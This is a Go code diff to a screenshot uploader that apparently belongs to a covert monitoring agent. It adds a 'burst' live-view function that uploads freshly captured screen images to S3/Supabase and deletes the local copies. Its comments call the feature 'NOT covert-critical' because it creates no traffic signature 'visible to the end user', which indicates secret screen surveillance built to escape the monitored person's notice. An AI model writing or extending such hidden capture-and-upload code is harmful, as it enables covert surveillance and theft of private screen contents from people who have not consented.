@@ -220,7 +220,7 @@ func (u *Uploader) FlushScreenshots() (int, error) {
 
 		filename := filepath.Base(r.LocalPath)
 
-		err := WithRetry(screenshotRetry, func() (permanent bool, err error) {
+		err := WithRetryTag(screenshotRetry, "screenshot "+filename, func() (permanent bool, err error) {
 			if !u.client.IsAvailable() {
 				return true, fmt.Errorf("circuit open")
 			}
@@ -248,6 +248,11 @@ func (u *Uploader) FlushScreenshots() (int, error) {
 				return false, fmt.Errorf("mark synced: %w", uploadErr)
 			}
 
+			// Now that the S3 object, metadata row, and buffer row are all
+			// consistent, it is safe to remove the local file. A crash before
+			// this point leaves the .jpg on disk so the next flush cycle retries.
+			_ = os.Remove(r.LocalPath)
+
 			flushed++
 			return false, nil
 		})
@@ -258,4 +263,45 @@ func (u *Uploader) FlushScreenshots() (int, error) {
 	}
 
 	return flushed, nil
+}
+
+// BurstUploadScreenshot performs a one-shot upload for a freshly-captured
+// screenshot. It bypasses the local SQLite buffer and FlushScreenshots retry
+// loop entirely, so live-view frames land in Supabase with minimum latency.
+// A failed upload is dropped (not re-queued) — live frames are ephemeral.
+//
+// Used by the agent's live-view burst mode. NOT covert-critical: the frames
+// go through the same Supabase screenshot pipeline as regular captures, so
+// there is no new traffic signature visible to the end user.
+func (u *Uploader) BurstUploadScreenshot(localPath string, capturedAt time.Time) error {
+	if !u.client.IsAvailable() {
+		// Drop frame silently — circuit breaker open. Try again next tick.
+		_ = os.Remove(localPath)
+		return fmt.Errorf("circuit open")
+	}
+
+	filename := filepath.Base(localPath)
+	uploadURL, s3Key, err := u.client.GetPresignedUploadURL(filename)
+	if err != nil {
+		_ = os.Remove(localPath)
+		return fmt.Errorf("presign: %w", err)
+	}
+
+	var fileSizeBytes int64
+	if fi, statErr := os.Stat(localPath); statErr == nil {
+		fileSizeBytes = fi.Size()
+	}
+
+	if err := uploadFileToS3(u.client, localPath, uploadURL); err != nil {
+		_ = os.Remove(localPath)
+		return fmt.Errorf("upload: %w", err)
+	}
+
+	if err := u.client.SaveScreenshotMeta(s3Key, capturedAt, fileSizeBytes); err != nil {
+		_ = os.Remove(localPath)
+		return fmt.Errorf("save meta: %w", err)
+	}
+
+	_ = os.Remove(localPath)
+	return nil
 }
